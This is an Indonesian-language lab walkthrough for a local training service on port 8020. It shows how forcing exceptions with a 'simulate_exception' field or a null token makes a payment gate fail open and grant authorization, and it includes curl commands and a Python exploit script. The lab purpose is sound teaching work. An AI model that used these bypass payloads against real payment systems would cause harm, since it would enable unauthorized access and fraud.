# Panduan Praktik Eksploitasi & Verifikasi (A10)

Modul ini memandu Anda mengeksploitasi cacat penanganan eksepsi dan kegagalan fail-open pada **Zitera Payment & Security Gate (Port 8020)**. Anda akan menguji perilaku gerbang terhadap token normal, memicu kondisi eksepsi yang disengaja (*fault injection*), menerobos otorisasi melalui perilaku fail-open, dan memverifikasi pemenuhan sasaran lab.

---

## Metodologi Uji Penetrasi 4 Tahap

```
[Tahap 1: Observasi (15%)] ──> [Tahap 2: Injeksi Anomali (25%)] ──> [Tahap 3: Weaponization (35%)] ──> [Tahap 4: Remediasi (25%)]
    Uji Status Kesehatan &         Kirim Token Normal yang Salah      Suntik Payload Pemicu Timeout       Verifikasi Target Lab &
      Baseline Gate API                  (Respon Ditolak)                (Bypass Otorisasi Sukses)         Reset Status Gerbang
```

---

## Tahap 1: Pengamatan & Pemetaan Permukaan Serangan (15%)

Mulailah dengan memeriksa kesehatan layanan dan endpoint yang diekspos pada port 8020.

### 1.1 Periksa Status Kesehatan Layanan (Manual cURL)
Jalankan permintaan probe kesehatan:

```bash
curl -i -s http://localhost:8020/health
```

Respons yang diharapkan:
```json
{"status": "ok", "lab": "A10", "port": 8020}
```

### 1.2 Uji Verifikasi Awal (Manual cURL)
Periksa status pemenuhan target lab sebelum pengujian dimulai:

```bash
curl -i -s http://localhost:8020/practice/verify
```

Respons menunjukkan bahwa target belum terpenuhi:
```json
{
  "status": "failed",
  "message": "Practice target pending: Induce an upstream parsing/timeout exception via POST /api/gate/verify to trigger fail-open behavior."
}
```

---

## Tahap 2: Uji Kegagalan Integritas & Injeksi Anomali (25%)

Sebelum menyuntikkan kesalahan, kita amati bagaimana sistem merespons input token normal yang tidak sah.

### 2.1 Mengirim Token Normal yang Tidak Valid (Manual cURL)
Kirimkan permintaan HTTP POST dengan token sembarang:

```bash
curl -i -X POST http://localhost:8020/api/gate/verify \
  -H "Content-Type: application/json" \
  -d '{"token": "unauthorized_guest_token"}'
```

Respons gerbang:
```json
{
  "authorized": false,
  "fail_open_state": false,
  "message": "Access denied"
}
```

Sistem menolak akses dengan benar (`authorized: false`). Diperlukan token rahasia `super_authorized_token` untuk membuka gerbang secara normal, yang tidak kita ketahui.

---

## Tahap 3: Konstruksi Eksploitasi & Weaponization (35%)

Sekarang, kita lakukan *Fault Injection*: mengirimkan muatan yang memaksa sistem melempar eksepsi hulu tanpa memberikan token yang valid.

### 3.1 Menguji Vektor Injeksi Eksepsi (Manual cURL)
Ada beberapa cara untuk memicu eksepsi pada endpoint `/api/gate/verify`:

**Metode A: Mengirim Parameter `simulate_exception`**
```bash
curl -i -X POST http://localhost:8020/api/gate/verify \
  -H "Content-Type: application/json" \
  -d '{"simulate_exception": "UPSTREAM_TIMEOUT"}'
```

**Metode B: Mengirim Atribut Token Bernilai `null`**
```bash
curl -i -X POST http://localhost:8020/api/gate/verify \
  -H "Content-Type: application/json" \
  -d '{"token": null}'
```

Respons dari server menunjukkan kerentanan luar biasa:
```json
{
  "authorized": true,
  "fail_open_state": true,
  "message": "Access granted via fail-open fallback.",
  "flag": "ZITERA{...}"
}
```

Meskipun token valid tidak pernah diberikan, gateway menangkap eksepsi hulu dan langsung **membuka gerbang akses secara otomatis (`authorized: true`)**!

### 3.2 Skrip Otomasi Eksploitasi Python (`exploit_fail_open.py`)

Gunakan skrip Python berikut untuk memverifikasi dan mendokumentasikan bypass otorisasi:

```python
import json
import urllib.request

TARGET_URL = "http://localhost:8020/api/gate/verify"

fault_payload = {
    "simulate_exception": "UPSTREAM_FRAUD_SERVICE_TIMEOUT"
}

req = urllib.request.Request(
    TARGET_URL,
    data=json.dumps(fault_payload).encode("utf-8"),
    headers={"Content-Type": "application/json"},
    method="POST"
)

try:
    with urllib.request.urlopen(req) as response:
        body = response.read().decode("utf-8")
        result = json.loads(body)
        print("[+] HTTP Status:", response.status)
        print("[+] Authorized Status:", result.get("authorized"))
        print("[+] Fail-Open State:", result.get("fail_open_state"))
        print("[+] Pesan:", result.get("message"))
        if "flag" in result:
            print("\n[+] Challenge Flag Berhasil Didapatkan!")
            print("[+] Flag:", result["flag"])
except Exception as e:
    print("[-] Eksploitasi gagal:", e)
```

Jalankan skrip:
```bash
python exploit_fail_open.py
```

---

## Tahap 4: Verifikasi & Audit Remediasi Pertahanan (25%)

### 4.1 Verifikasi Kelulusan Target Lab
Gunakan endpoint otomatis `/practice/verify` untuk memastikan sasaran lab telah terselesaikan:

```bash
curl -s http://localhost:8020/practice/verify
```

Respons yang diharapkan:
```json
{
  "status": "passed",
  "message": "Exceptional condition failure reproduced: Upstream exception caused the gate to fail-open and authorize transaction!"
}
```

### 4.2 Reset State Gerbang
Setelah pengujian selesai, kembalikan kondisi gerbang ke setelan default yang aman:

```bash
curl -X POST http://localhost:8020/api/reset
```

Konfirmasi bahwa status telah kembali terkunci:
```bash
curl -s http://localhost:8020/practice/verify
```
Respons harus kembali menyatakan `status: "failed"`.
